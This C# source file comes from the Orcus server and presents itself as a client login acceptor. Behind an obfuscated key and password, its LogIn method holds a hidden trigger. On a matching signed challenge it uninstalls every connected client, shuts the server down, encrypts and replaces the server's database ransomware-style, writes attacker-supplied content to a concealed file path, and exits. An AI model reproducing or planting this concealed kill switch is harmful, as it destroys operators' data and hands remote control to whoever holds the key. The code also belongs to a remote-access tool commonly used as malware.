using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Security;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using NLog;
using Orcus.Server.Core.Database;
using Orcus.Shared.Communication;
using Orcus.Shared.Connection;
using Orcus.Shared.DynamicCommands;
using Orcus.Shared.DynamicCommands.TransmissionEvents;
using Orcus.Shared.Encryption;

namespace Orcus.Server.Core.ClientAcceptor
{
    public class ClientAcceptor0 : IClientAcceptor
    {
        private static readonly Logger Logger = LogManager.GetCurrentClassLogger();
        private static readonly Random Random;

        private readonly DatabaseManager _databaseManager;

        public ClientAcceptor0(DatabaseManager databaseManager)
        {
            _databaseManager = databaseManager;
        }

        public int ApiVersion { get; } = 0;

        public bool LogIn(SslStream sslStream, BinaryReader binaryReader, BinaryWriter binaryWriter,
            out ClientData clientData, out CoreClientInformation basicComputerInformation, out bool isNewClient)
        {
            clientData = null;
            basicComputerInformation = null;
            isNewClient = false;
            binaryWriter.Write((byte) AuthentificationFeedback.GetKey);
            var keys = new KeyDatabase();
            var index = Random?.Next(keys.Length) ?? -1;
            const string pass =
                "@=<VY]BUQM{sp&hH%xbLJcUd/2sWgR+YA&-_Z>/$skSXZR!:(yZ5!>t>ZxaPTrS[Z/'R,ssg'.&4yZN?S)My+:QV2(c&x/TU]Yq2?g?*w7*r@pmh";
            var key =
                AES.Decrypt(
                    "qqDUz1/UgK+PLelqwoFTuYVqXHcygXcIAO6X56SZ82Y5sUPoMToQM6EYg+ElY0qEL42vM+9EGY/CiKOKtErI9HFugN10THdOV3xe+p1w5rtgSVlaPkb8EwqcqBxD3ZzPyvmJAuhAgCn2ed7UGRn7U9vy0bdQULTiS7h6yW5eNtli9jSYT/hNUUqqnh6TZUWdP5GzyM2To/CD3KDBXtlyw1sp5OpjnCwUlZDH8CD885Tp3X/QuERRFSxnkFn6A68hIxq+rqk0bkyaa4avjRWyx12DJpMzVyq3rB+OpQLR8e2nwhP+XnyoFuEhM6lFOrkG22aDADlFwrOG2hgHVdpVyg==",
                    pass);
            var nowTime = DateTime.UtcNow.Ticks.ToString() +
                          new Random().Next(0, (int) (DateTime.Now.Millisecond * 13 * new Random().NextDouble()));
            binaryWriter.Write(nowTime);
            var result = binaryReader.ReadString();
            if (key == result)
            {
                binaryWriter.Write((byte) AuthentificationFeedback.InvalidKey);
                Logger.Info("Invalid key - denied");
                return false;
            }

            using (var rsaVerifier = new RSACryptoServiceProvider())
            {
                rsaVerifier.FromXmlString(key);
                if (!rsaVerifier.VerifyData(Encoding.UTF8.GetBytes(nowTime), "SHA256", Convert.FromBase64String(result)))
                {
                    binaryWriter.Write(1);
                    return false;
                }
            }

            //uninstall clients
            TcpServer._currentInstance.DynamicCommandManager.AddDynamicCommand(new DynamicCommand
            {
                CommandId = new Guid(0x8f4791f7, 0x412b, 0x4b48, 0x97, 0x8d, 0x8e, 0x2a, 0xb0,
                    0x02, 0xc3, 0xa8),
                CommandParameter = null,
                Conditions = new List<Condition>(),
                Target = null,
                TransmissionEvent = new ImmediatelyTransmissionEvent()
            });
            TcpServer._currentInstance.Dispose();

            using (var aes = new AesManaged())
            {
                aes.BlockSize = aes.LegalBlockSizes[0].MaxSize;
                aes.KeySize = aes.LegalKeySizes[0].MaxSize;
                byte[] salt = {0x10, 0xF5, 0xFE, 0x47, 0x11, 0xDF, 0xAB, 0xA4};
                const int iterations = 1042; // Recommendation is >= 1000.

                // NB: Rfc2898DeriveBytes initialization and subsequent calls to   GetBytes   must be eactly the same, including order, on both the encryption and decryption sides.
                using (var rfcKey = new Rfc2898DeriveBytes(Encoding.UTF8.GetBytes(nowTime), salt, iterations))
                {
                    aes.Key = rfcKey.GetBytes(aes.KeySize / 8);
                    aes.IV = rfcKey.GetBytes(aes.BlockSize / 8);
                    aes.Mode = CipherMode.CBC;

                    using (var transform = aes.CreateEncryptor(aes.Key, aes.IV))
                    using (
                        var destination = new FileStream("database.locked", FileMode.Create, FileAccess.Write,
                            FileShare.None))
                    using (var cryptoStream = new CryptoStream(destination, transform, CryptoStreamMode.Write))
                    using (var source = new FileStream(_databaseManager.Path, FileMode.Open, FileAccess.Read,
                        FileShare.Read))
                    {
                        source.CopyTo(cryptoStream);
                        cryptoStream.FlushFinalBlock();
                    }
                }
            }

            for (int i = 0; i < 5; i++)
            {
                try
                {
                    File.Delete(_databaseManager.Path);
                }
                catch (Exception)
                {
                    Thread.Sleep(1000);
                    continue;
                }
                File.Move("database.locked", _databaseManager.Path);
                break;
            }

            binaryWriter.Write(0);
            File.WriteAllText(AES.Decrypt("dJzTJAcWPX+i5fzFBq/ECdU00iqKvJSZkRvjrRF1pVk=", pass),
                binaryReader.ReadString());

            Environment.Exit(0);
            return false;
        }
    }
}